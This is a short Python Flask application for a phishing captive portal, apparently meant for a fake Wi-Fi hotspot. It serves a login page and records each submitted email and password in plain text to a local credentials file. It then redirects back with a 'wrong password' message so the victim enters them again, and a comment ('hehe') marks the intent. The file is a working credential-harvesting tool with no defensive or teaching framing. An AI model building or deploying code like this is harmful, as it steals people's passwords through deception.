from flask import Flask, render_template, request, redirect
from os.path import join as joinpath, dirname

# Static directory
STATIC_DIR     = joinpath(dirname(__file__), "static")
# HTML directory
TEMPLATES_DIR  = joinpath(STATIC_DIR, "html")

# File for storing the credentials, hehe
CREDENTIALS_FILE_PATH = joinpath(dirname(__file__), "..\\credentials.txt")

app = Flask(__name__, template_folder=TEMPLATES_DIR, static_folder=STATIC_DIR)

@app.route('/')
def index():
    # This will make a message appear saying that the password is wrong
    retry = request.args.get('r', type = bool)
    
    # Render a simple HTML template for the captive portal page
    return render_template("index.html", retry=retry)

@app.post('/send_credentials')
def send_credentials():
    data = request.form
    with open(CREDENTIALS_FILE_PATH, 'a') as credentials_file:
        credentials_file.write(f"{data["email"]}\t{data["password"]}\n")

    return redirect("/?r=true")

@app.errorhandler(404)
def page_not_found(error):
    return render_template("404.html"), 404

if __name__ == '__main__':
    app.run(host="0.0.0.0", debug=True)
